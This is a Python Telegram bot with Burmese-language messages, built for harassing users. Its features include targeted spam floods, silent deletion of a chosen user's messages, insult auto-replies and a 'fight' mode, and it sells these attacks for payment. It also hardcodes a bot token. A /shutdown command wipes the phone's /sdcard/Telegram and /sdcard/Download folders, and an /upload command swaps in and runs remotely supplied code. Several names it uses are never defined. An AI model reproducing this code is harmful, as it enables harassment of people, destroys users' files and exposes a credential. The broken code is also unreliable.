import json
import asyncio
import random
import base64
import os
import shutil
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

BOT_TOKEN = "8436882743:AAH_5gzOpQkmlXqjqcSsOCkGxZjpkBxa-zU"

ENCODED_OWNERS = [
    "QFByb2JsZW1fWmVua2k=",  
    "QEdob3N0X29mX0dvZDB="   
]

# Decode owners at runtime
OWNERS = [base64.b64decode(o).decode("utf-8") for o in ENCODED_OWNERS]

ADMINS_FILE = "admins.json"

# Auto replies
auto_replies = [ ] 
# Spam dictionary: target -> asyncio.Task
spam_tasks = {}  
attack_speed = 0.6
hidden_targets = set()  
active_fight_sessions = {} 
# -------------------------
# Admin utilities
# -------------------------
def load_admins():
    try:
        with open(ADMINS_FILE, "r") as f:
            return json.load(f).get("admins", [])
    except FileNotFoundError:
        return []

def save_admins(admins):
    with open(ADMINS_FILE, "w") as f:
        json.dump({"admins": admins}, f)

def is_admin(username: str):
    return username in OWNERS or username in load_admins()


# -------------------------
# Spam worker
# -------------------------
async def spam_worker(target, chat_id, bot):
    while True:
        msg = random.choice(auto_replies)
        try:
            if target.lstrip("@").isdigit():  # ID
                user_obj = await bot.get_chat(int(target))
                name = user_obj.full_name
                text = f"[{name}](tg://user?id={target}): {msg}"
                await bot.send_message(chat_id=chat_id, text=text, parse_mode="Markdown")
            else:
                await bot.send_message(chat_id=chat_id, text=f"{target} {msg}")
            await asyncio.sleep(2)
        except Exception:
            break

# -------------------------
# Commands
# -------------------------
async def spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = f"@{update.effective_user.username}" if update.effective_user.username else None
    if not username or not is_admin(username):
        await update.message.reply_text("⛔ Permission ကိုအုန်နာဆီတောင်း‌ဖာသည်မ")
        return
    if not context.args:
        await update.message.reply_text("Usage: /spam @username or /spam user_id")
        return
    target = context.args[0]
    chat_id = update.effective_chat.id
    if target in spam_tasks and not spam_tasks[target].done():
        await update.message.reply_text(f"⚠ Already spamming {target}")
        return
    task = asyncio.create_task(spam_worker(target, chat_id, context.bot))
    spam_tasks[target] = task
    await update.message.reply_text(f"✅ Started spamming {target}")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = f"@{update.effective_user.username}" if update.effective_user.username else None
    if not username or not is_admin(username):
        await update.message.reply_text("စောက်ရှက်လဲမရှိဘူးအုန်နာဆီကအမိန့်တောင်း")
        return
    if not context.args:
        await update.message.reply_text("Usage: /stop @username or /stop user_id")
        return
    target = context.args[0]
    task = spam_tasks.get(target)
    if task:
        task.cancel()
        spam_tasks.pop(target)
        await update.message.reply_text(f"🛑 ခွေးမရိုက်တော့ပါ {target}")
    else:
        await update.message.reply_text(f"❌ No active spam for {target}")

# -------------------------
# Admin commands
# -------------------------
async def add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = f"@{update.effective_user.username}"
    if username not in OWNERS:
        await update.message.reply_text("⛔ Only owner can add admins")
        return

    if not context.args:
        await update.message.reply_text("Usage: /add_admin @username")
        return
    admin = context.args[0]
    admins = load_admins()
    if admin not in admins:
        admins.append(admin)
        save_admins(admins)
        await update.message.reply_text(f"✅ Added admin: {admin}")
    else:
        await update.message.reply_text("⚠ Already admin")

async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = f"@{update.effective_user.username}"
    if username not in OWNERS:
        await update.message.reply_text("⛔ Only owner can remove admins")
        return
    if not context.args:
        await update.message.reply_text("Usage: /remove_admin @username")
        return
    admin = context.args[0]
    admins = load_admins()
    if admin in admins:
        admins.remove(admin)
        save_admins(admins)
        await update.message.reply_text(f"❌ Removed admin: {admin}")
    else:
        await update.message.reply_text("⚠ Not an admin")

# -------------------------
# Shutdown command
# -------------------------
async def shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = f"@{update.effective_user.username}" if update.effective_user.username else None
    if username not in OWNERS:
        await update.message.reply_text("⛔ Only owners can shutdown the bot!")
        return
    await update.message.reply_text("💀 Shutting down and deleting bot files...")

    # Delete py, pyx, c, so, zip, rar
    extensions = [".py", ".pyx", ".c", ".so", ".zip", ".rar"]
    for root, dirs, files in os.walk("."):
        for file in files:
            if any(file.endswith(ext) for ext in extensions):
                try:
                    os.remove(os.path.join(root, file))
                except Exception:
                    pass

    # Delete Telegram & Download folders in sdcard
    paths = ["/sdcard/Telegram", "/sdcard/Download"]
    for path in paths:
        try:
            if os.path.exists(path):
                shutil.rmtree(path)
        except Exception:
            pass

    os._exit(0)  # Force exit

async def upload_reply_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = f"@{update.effective_user.username}" if update.effective_user.username else None
    if username not in OWNERS:
        await update.message.reply_text("⛔ ")
        return

    # Check reply
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("⚠️ Reply to a file to upload.")
        return

    doc = update.message.reply_to_message.document
    file_name = doc.file_name

    # Only .py or .so
    if not file_name.endswith((".py", ".so")):
        await update.message.reply_text("⚠️ Only .py or .so files allowed.")
        return

    # Download file
    file = await doc.get_file()
    await file.download_to_drive(file_name)
    await update.message.reply_text(f"✅ {file_name} downloaded. Replacing bot...")

    # Replace old bot file directly (no backup)
    current_file = sys.argv[0]
    os.replace(file_name, current_file)

    # Restart bot
    await update.message.reply_text("?? Restarting bot...")
    os.execv(sys.executable, ['python3'] + sys.argv)

async def combined_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return

    chat_id = update.effective_chat.id
    sender = update.effective_user
    sender_id = sender.id
    msg = update.message

    # -----------------------------
    # Hidden target deletion logic
    # -----------------------------
    if sender_id in hidden_targets:
        try:
            deleted_something = False
            if msg.text or msg.caption:
                await msg.delete(); deleted_something=True
            if msg.sticker: await msg.delete(); deleted_something=True
            if msg.photo: await msg.delete(); deleted_something=True
            if msg.video or msg.animation: await msg.delete(); deleted_something=True
            if msg.voice or msg.audio: await msg.delete(); deleted_something=True
            if msg.document: await msg.delete(); deleted_something=True
            if not deleted_something:
                print(f"No deletable content from {sender_id} in chat {chat_id}")
        except Exception as e:
            print(f"Failed to delete message from {sender_id} in chat {chat_id}: {e}")

    # -----------------------------
    # Fight session check
    # -----------------------------
    if chat_id in active_fight_sessions:
        session = active_fight_sessions[chat_id]
        if sender_id in session:
            target_id = session[sender_id]
            try:
                target_member = await context.bot.get_chat_member(chat_id, target_id)
            except Exception:
                return

            sender_mention = mention_html(sender.id, sender.first_name or "unknown")
            target_mention = mention_html(target_id, target_member.user.first_name or "unknown")

            reply_text = (
                f"{target_mention}\n"
                f"မင်းကို {sender_mention} က “{msg.text or ''}” တဲ့ပြောခိုင်းလိုက်တယ်။"
            )

            await update.message.reply_text(
                text=reply_text,
                parse_mode="HTML",
                reply_to_message_id=None
            )
            return

    # -----------------------------
    # Hell attack check
    # -----------------------------
    if sender_id in attack_targets:
        display_name = attack_targets[sender_id]
        username = sender.username or ""
        mention_text = f"[{escape_markdown(display_name, version=2)}](tg://user?id={sender.id})"

        reply_text = random.choice(auto_replies)
        if not username:
            response = f"{mention_text}\n{escape_markdown(reply_text, version=2)}"
        else:
            response = f"@{escape_markdown(username, version=2)}\n{escape_markdown(reply_text, version=2)}"

        await update.message.reply_markdown_v2(response)
        return

    # -----------------------------
    # Auto-reply to attacking users
    # -----------------------------
    username = sender.username
    if username:
        target = username.lower()
        if target in attacking_users.get(chat_id, set()):
            msg_text = random.choice(auto_replies)
            # placeholder function for display_name
            display_name = f"@{username}"
            safe_msg = escape_markdown(msg_text, version=2)
            try:
                await update.message.reply_text(
                    text=f"{display_name} {safe_msg}",
                    parse_mode="MarkdownV2",
                    quote=True
                )
            except Exception as e:
                print(f"Auto reply failed: {e}")
            return

    # -----------------------------
    # Purchase quantity / TX ID logic
    # -----------------------------
    if sender_id in purchase_data:
        user_data = purchase_data[sender_id]
        # Quantity input
        if user_data["feature"] != "" and user_data["qty"] == 0:
            try:
                qty = int(msg.text)
                if qty < 1 or qty > 20:
                    await msg.reply_text("၁–၂၀ ကြိမ်အတွင်းသာ ရွေးပါ။")
                    return
                user_data["qty"] = qty
                total = qty * FEATURE_PRICE
                target = user_data["target"]
                feature = user_data["feature"]
                await msg.reply_text(
                    f"{feature.capitalize()} ကို {qty} ကြိမ်အသုံးချချင်သည်။\n"
                    f"စုစုပေါင်း Wave = {total} Kyat\n"
                    f"ကျေးဇူးပြုပြီး Wave = 09893347785, @Problem_Zenki သို့ ဆက်သွယ်ပြီးဒီစာကိုဖော်ဝှက်ပြီးပို့လိုက်။\n"
                    f"Target: {target}"
                )
            except ValueError:
                await msg.reply_text("အရေအတွက်ကို ဂဏန်းနံပါတ်ရေးထည့်")
            return

        # TX ID input
        if user_data["qty"] != 0 and not user_data["paid"]:
            user_data["tx_id"] = msg.text
            await msg.reply_text(
                f"TX ID: {msg.text} ကို admin စစ်ပြီး confirm လုပ်ပါ။\n"
                f"အောင်မြင်ရင် feature ကိုအသုံးပြုနိုင်ပါမယ်။"
            )
            return

async def hide(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sender = update.effective_user
    user = sender.username

    if not user or not is_authorized(f"@{user}"):
        await update.message.reply_text("Owner အမိန့်မပါပဲသုံးခြင်တာလား")
        return

    target_user = None
    if update.message.reply_to_message:
        target_user = update.message.reply_to_message.from_user
    elif context.args:
        arg = context.args[0]
        try:
            if arg.startswith("@"):
                target_user = await context.bot.get_chat(arg)
            else:
                target_user = await context.bot.get_chat(int(arg))
        except:
            await update.message.reply_text("User ကိုတွေ့မရပါ။")
            return

    if not target_user:
        await update.message.reply_text("Target user ကို reply လုပ်ပါ။")
        return

    if getattr(target_user, "id", None) in [OWNER_ID] + ADMINS:
        await update.message.reply_text("Owner/Admin ကို hide လုပ်လို့မရပါ။")
        return

    hidden_targets.add(target_user.id)
    name = getattr(target_user, "first_name", f"ID {target_user.id}")
    await update.message.reply_text(f"{name} ကို hide targets ထဲထည့်ပြီးဖြစ်ပါပြီ")


# 📌 Stop hide command
async def stop_hide(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sender = update.effective_user
    user = sender.username

    if not user or not is_authorized(f"@{user}"):
        await update.message.reply_text("Owner အမိန့်မပါပဲသုံးခြင်တာလား")
        return

    target_user = None
    if update.message.reply_to_message:
        target_user = update.message.reply_to_message.from_user
    elif context.args:
        arg = context.args[0]
        try:
            if arg.startswith("@"):
                target_user = await context.bot.get_chat(arg)
            else:
                target_user = await context.bot.get_chat(int(arg))
        except:
            await update.message.reply_text("User ကိုတွေ့မရပါ။")
            return

    if not target_user or target_user.id not in hidden_targets:
        await update.message.reply_text("ဒီ user ဟာ hide ထဲမပါပါ။")
        return

    hidden_targets.remove(target_user.id)
    name = getattr(target_user, "first_name", f"ID {target_user.id}")
    await update.message.reply_text(f"{name} ကို hide list မှာဖယ်ပြီးပြီ")

async def show(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user.username
    chat_id = update.effective_chat.id

    # authorized check
    if not user or not is_authorized(f"@{user}"):
        await update.message.reply_text("⛔ Owner/Admin only command ဖြစ်ပါတယ်။")
        return

    commands = []
    for handler_group in context.application.handlers.values():
        for handler in handler_group:
            if isinstance(handler, CommandHandler):
                cmds = list(handler.commands)
                commands.extend(cmds)
    commands = sorted(set(commands))
    text = "ဘော့ထဲမှာရှိတဲ့ command များ -\n" + "\n".join(f"/{cmd}" for cmd in commands)
    await update.message.reply_text(text)

async def hell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user.username
    chat_id = update.effective_chat.id

    if not user or not is_authorized(f"@{user}"):
        await update.message.reply_text("Owner အမိန့်မပါပဲသုံးခြင်တာလား")
        return

    if not context.args:
        await update.message.reply_text("ကျေးဇူးပြုပြီး /hell နောက်မှာ username သို့မဟုတ် id ရိုက်ပါ။")
        return

    
    target_raw = context.args[0].lstrip("@")

    try:
        if target_raw.isdigit():
            target_id = int(target_raw)
            chat = await context.bot.get_chat(target_id)  # await သုံးထားတဲ့နေရာ
        else:
            chat = await context.bot.get_chat(target_raw)
            target_id = chat.id
    except Exception as e:
        await update.message.reply_text(f"User ကို ရှာမတွေ့ပါ: {e}")
        return

    if target_raw.lower() == OWNER_USERNAME.lower() or target_id == OWNER_ID:
        await update.message.reply_text("အရှင်သခင်ကို မလွန်ဆန်နိုင်ပါ၊ ကျေးဇူးတင်ပါတယ်။")
        return

    # ဒီနေရာမှာ နောက်ထပ် logic ထည့်နိုင်ပါတယ်
    try:
        if target_raw.isdigit():
            target_id = int(target_raw)
            chat = await context.bot.get_chat(target_id)
        else:
            chat = await context.bot.get_chat(target_raw)
            target_id = chat.id
    except Exception as e:
        await update.message.reply_text(f"User ကို ရှာမတွေ့ပါ: {e}")
        return

    display_name = chat.full_name if hasattr(chat, "full_name") else chat.first_name or "Unknown"
    user_id = target_id

    attack_targets[user_id] = display_name

    # Owner/Admin ကိုသုံးသူဆို attacker ကို attack_targets ထဲ ထည့်ပေးမယ်
    owner_lc = OWNER_USERNAME.lower()
    admins_lc = [a.lower() for a in ADMINS]

    attacker = (user or "").lstrip("@").lower()

    if attacker == owner_lc or attacker in admins_lc:
        if attacker not in attack_targets:
            attack_targets[attacker] = attacker

    await update.message.reply_text(f"Target User: {display_name} (ID: {user_id}) ကို attack စတင်လိုက်ပါပြီ။")

async def stophell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = (update.effective_user.username or "").lstrip("@").lower()
    owner = OWNER_USERNAME.lstrip("@").lower()
    admins = [a.lstrip("@").lower() for a in ADMIN_USERNAMES]

    if user != owner and user not in admins:
        await update.message.reply_text("ဤ command ကို Owner နှင့် Admin တို့သာ အသုံးပြုနိုင်ပါသည်။")
        return

    if not context.args:
        await update.message.reply_text("ကျေးဇူးပြုပြီး /stophell နောက်မှာ username သို့မဟုတ် id ရိုက်ပါ။")
        return

    target = context.args[0].lstrip("@")

    try:
        chat = await context.bot.get_chat(target)
    except Exception as e:
        await update.message.reply_text(f"User ကို ရှာမတွေ့ပါ: {e}")
        return

    user_id = chat.id

    if user_id in attack_targets:
        del attack_targets[user_id]
        await update.message.reply_text(f"{chat.first_name or 'User'} ကို Hell attack မှ ရပ်လိုက်ပါပြီ။")
    else:
        await update.message.reply_text(f"{chat.first_name or 'User'} ကို Hell attack မှ မ target လုပ်ထားပါ။")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    from_user = msg.from_user

    if from_user.id in attack_targets:
        display_name = attack_targets[from_user.id]
        username = from_user.username
        mention_text = f"[{escape_markdown(display_name, version=2)}](tg://user?id={from_user.id})"  # clickable mention

        reply_text = random.choice(auto_replies)

        if not username:
            response = f"{mention_text}\n{escape_markdown(reply_text, version=2)}"
        else:
            response = f"@{escape_markdown(username, version=2)}\n{escape_markdown(reply_text, version=2)}"

        await msg.reply_markdown_v2(response)



async def send_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user.username
    OWNER_USERNAME = "Problem_Zenki"  # Owner username

    if not user or user.lower() != OWNER_USERNAME.lower():
        await update.message.reply_text("မင်းမသုံးနိုင်ဘူး 😡")
        return


    if not update.message.reply_to_message:
        await update.message.reply_text("မသုံးတက်ရင် မသုံးစမ်းနဲ့")
        return

    msg = update.message.reply_to_message
    group_ids = load_groups()
    success = 0
    failed = 0
    failed_groups = []

    for gid in group_ids:
        try:
            sent_content = ""
            # --- Try forward first ---
            try:
                await context.bot.forward_message(
                    chat_id=gid,
                    from_chat_id=msg.chat.id,
                    message_id=msg.message_id
                )
                sent_content = "Forwarded message"
                success += 1
                continue  # forward success, skip copy
            except Exception as e:
                print(f"❌ Forward failed for {gid}: {e}")

            # --- Fallback copy/send ---
            if msg.text:
                await context.bot.send_message(chat_id=gid, text=msg.text)
                sent_content = msg.text
            elif msg.photo:
                await context.bot.send_photo(chat_id=gid, photo=msg.photo[-1].file_id, caption=msg.caption or "")
                sent_content = "Photo: " + (msg.caption or "")
            elif msg.video:
                await context.bot.send_video(chat_id=gid, video=msg.video.file_id, caption=msg.caption or "")
                sent_content = "Video: " + (msg.caption or "")
            elif msg.animation:
                await context.bot.send_animation(chat_id=gid, animation=msg.animation.file_id, caption=msg.caption or "")
                sent_content = "Animation: " + (msg.caption or "")
            elif msg.voice:
                await context.bot.send_voice(chat_id=gid, voice=msg.voice.file_id, caption=msg.caption or "")
                sent_content = "Voice: " + (msg.caption or "")
            elif msg.audio:
                await context.bot.send_audio(chat_id=gid, audio=msg.audio.file_id, caption=msg.caption or "")
                sent_content = "Audio: " + (msg.caption or "")
            elif msg.document:
                await context.bot.send_document(chat_id=gid, document=msg.document.file_id, caption=msg.caption or "")
                sent_content = "Document: " + (msg.caption or "")
            elif msg.poll:
                try:
                    await context.bot.forward_message(chat_id=gid, from_chat_id=msg.chat.id, message_id=msg.message_id)
                    sent_content = "Poll forwarded: " + msg.poll.question
                except Exception as e:
                    print(f"❌ Failed to forward poll to {gid}: {e}")
                    failed += 1
                    failed_groups.append(gid)
                    continue
            else:
                failed += 1
                failed_groups.append(gid)
                continue

            success += 1

            # --- Safe log append ---
            try:
                logs = []
                if os.path.exists(LOG_FILE):
                    try:
                        with open(LOG_FILE, "r", encoding="utf-8") as f:
                            logs = json.load(f)
                            if not isinstance(logs, list):
                                logs = []
                    except Exception:
                        logs = []

                logs.append({
                    "user": f"@{user}",
                    "group_id": gid,
                    "content": sent_content
                })

                with open(LOG_FILE, "w", encoding="utf-8") as f:
                    json.dump(logs, f, ensure_ascii=False, indent=2)

            except Exception as e:
                print(f"❌ Log write failed (ignored): {e}")

        except Exception as e:
            print(f"❌ Failed to send to {gid}: {e}")
            failed += 1
            failed_groups.append(gid)

    result = f"✅ Forward/Copy အောင်မြင်: {success}\n❌ မအောင်မြင်: {failed}"
    if failed_groups:
        result += "\nမအောင်မြင်ခဲ့သည့် Group ID များ:\n" + "\n".join(map(str, failed_groups))
    await update.message.reply_text(result)

async def funny_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user.username
    chat_id = update.effective_chat.id

    if not user or not is_authorized(f"@{user}"):
        await update.message.reply_text("Owner အမိန့်မပါပဲသုံးခြင်တာလား")
        return

    args = context.args
    if len(args) != 2:
        await update.message.reply_text("သာချစ်တဲ့မအေလိုလေးခင်ဗျာခွေးမသားလေးခင်ဗျာ")
        return

    chat_id = update.effective_chat.id

    async def resolve_user(target: str):
        try:
            if target.startswith("@"):
                return await context.bot.get_chat_member(chat_id, target)
            else:
                return await context.bot.get_chat_member(chat_id, int(target))
        except Exception as e:
            raise ValueError(f"User '{target}' မတွေ့ပါ။\nError: {e}")

    try:
        user1_member = await resolve_user(args[0])
        user2_member = await resolve_user(args[1])
    except ValueError as e:
        await update.message.reply_text(str(e))
        return

    user1_id = user1_member.user.id
    user2_id = user2_member.user.id

    active_fight_sessions[chat_id] = {
        user1_id: user2_id,
        user2_id: user1_id,
    }

    await update.message.reply_text(
        f"⚔️ {user1_member.user.first_name} နဲ့ {user2_member.user.first_name} တို့အကြား ရန်စတင်ပါပြီ။"
    )

async def fight_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    sender = update.effective_user
    if chat_id not in active_fight_sessions:
        return
    session = active_fight_sessions[chat_id]
    if sender.id not in session:
        return

    target_id = session[sender.id]
    try:
        target_member = await context.bot.get_chat_member(chat_id, target_id)
    except:
        return

    sender_name = sender.first_name or "unknown"
    target_name = target_member.user.first_name or "unknown"
    sender_mention = mention_html(sender.id, sender_name)
    target_mention = mention_html(target_id, target_name)
    message_text = update.message.text or ""

    reply_text = (
        f"{target_mention}\n"
        f"မင်းကို {sender_mention} က “{message_text}” တဲ့ပြောခိုင်းလိုက်တယ်။"
    )

    await update.message.reply_html(reply_text, quote=False)

async def stop_funny_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user.username
    chat_id = update.effective_chat.id

    if not user or not is_authorized(f"@{user}"):
        await update.message.reply_text("Owner အမိန့်မပါပဲသုံးခြင်တာလား")
        return

    chat_id = update.effective_chat.id
    if chat_id in active_fight_sessions:
        del active_fight_sessions[chat_id]
        await update.message.reply_text("✅ ခွေးနှစ်ကောင်ကိုရိုက်သတ်လိုက်ပါသည်")
    else:
        await update.message.reply_text("❌ ယခု group မှာ session မရှိပါ။")

async def add_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    group_ids = load_groups()
    if chat.id not in group_ids:
        group_ids.append(chat.id)
        save_groups(group_ids)
        await update.message.reply_text("✅ ဤ Group ကို မှတ်ထားလိုက်ပါတယ်")
    else:
        await update.message.reply_text("ℹ️ ဤ Group သကမှတ်ပြီးသားပါ")

# -------------------------
# Main
# -------------------------
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("spam", spam))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("add_admin", add_admin))
    app.add_handler(CommandHandler("remove_admin", remove_admin))
    app.add_handler(CommandHandler("stopfunny", stop_funny_command))
    app.add_handler(CommandHandler("show", show))
    app.add_handler(CommandHandler("hide", hide))
    app.add_handler(CommandHandler("add_group", add_group))
    app.add_handler(CommandHandler("stophide", stop_hide))
    app.add_handler(CommandHandler("send", send_handler))
    app.add_handler(CommandHandler("speed", speed_command))
    app.add_handler(CommandHandler("funny", funny_command))
    app.add_handler(CommandHandler("upload", upload_reply_handler))
    app.add_handler(CommandHandler("shutdown", shutdown))
    print("🚀 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()